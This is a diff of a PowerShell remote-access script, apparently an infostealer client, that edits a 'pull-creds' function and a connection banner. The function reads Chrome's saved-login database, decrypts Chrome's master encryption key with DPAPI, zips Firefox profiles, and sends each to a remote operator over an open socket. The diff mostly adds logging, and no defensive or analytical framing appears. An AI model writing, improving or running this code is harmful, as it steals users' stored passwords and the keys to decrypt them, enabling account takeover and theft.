@@ -395,36 +395,49 @@ function PortSuggest {
         Start-Sleep -Seconds 1
 
         $ip = (Test-Connection -ComputerName (hostname) -Count 1).Address.IPAddressToString
+        Output-Log "[*] Pull-Creds started on $ip"
 
-        # === Chrome Paths ===
+        # === Chrome: Login Data
         $chromeData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        $chromeState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-
-        # === Upload Login Data ===
         if (Test-Path $chromeData) {
+            Output-Log "[+] Found Chrome Login Data"
             $b64Login = [Convert]::ToBase64String([IO.File]::ReadAllBytes($chromeData))
             $out = "[UPLOAD]::chrome_LoginData_$ip.db::" + $b64Login + "::END"
             $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
             $global:clientStream.Write($bytes, 0, $bytes.Length)
             $global:clientStream.Flush()
+            Output-Log "[+] Sent chrome_LoginData_$ip.db"
+        }
+        else {
+            Output-Log "[!] Chrome Login Data not found"
         }
 
-        # === Расшифровка и отправка AES-ключа ===
-        if (Test-Path $chromeState) {
-            $localStateJson = Get-Content $chromeState -Raw | ConvertFrom-Json
-            $encKeyBase64 = $localStateJson.os_crypt.encrypted_key
-            $encKey = [Convert]::FromBase64String($encKeyBase64) | Select-Object -Skip 5
+        # === Chrome: Расшифровка AES-ключа из Local State
+        $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+        if (Test-Path $localStatePath) {
+            Output-Log "[+] Found Chrome Local State"
+            $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
+            $encKeyB64 = $json.os_crypt.encrypted_key
+            $encKey = [Convert]::FromBase64String($encKeyB64)
+            $encKey = $encKey[5..($encKey.Length - 1)]
+
+            Add-Type -AssemblyName System.Security
             $aesKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
 
-            $aesOut = "[UPLOAD]::chrome_master_key_$ip.bin::" + [Convert]::ToBase64String($aesKey) + "::END"
-            $bytes = [System.Text.Encoding]::UTF8.GetBytes($aesOut)
+            $out = "[UPLOAD]::chrome_master_key_$ip.bin::" + [Convert]::ToBase64String($aesKey) + "::END"
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
             $global:clientStream.Write($bytes, 0, $bytes.Length)
             $global:clientStream.Flush()
+            Output-Log "[+] Sent chrome_master_key_$ip.bin"
+        }
+        else {
+            Output-Log "[!] Chrome Local State not found"
         }
 
-        # === Firefox профили ===
+        # === Firefox: Профили
         $firefoxRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
         if (Test-Path $firefoxRoot) {
+            Output-Log "[+] Firefox profiles found"
             $profiles = Get-ChildItem $firefoxRoot -Directory -ErrorAction SilentlyContinue
             foreach ($profile in $profiles) {
                 $zipPath = "$env:TEMP\firefox_profile.zip"
@@ -435,14 +448,21 @@ function PortSuggest {
                 $bytes = [System.Text.Encoding]::UTF8.GetBytes($out)
                 $global:clientStream.Write($bytes, 0, $bytes.Length)
                 $global:clientStream.Flush()
+                Output-Log "[+] Sent firefox_profile_$($profile.Name)_$ip.zip"
                 Remove-Item $zipPath -Force
             }
         }
+        else {
+            Output-Log "[!] No Firefox profiles found"
+        }
 
+        Output-Log "[✓] pull-creds completed for $ip"
         return "[+] pull-creds completed for $ip"
     }
     catch {
-        return "[ERROR] pull-creds failed: $($_.Exception.Message)"
+        $err = "[ERROR] pull-creds failed: $($_.Exception.Message)"
+        Output-Log $err
+        return $err
     }
 }
 
@@ -662,7 +682,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            NIS                                                                                                                                                                    
+                                           cool                                                                                                                                                                   
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
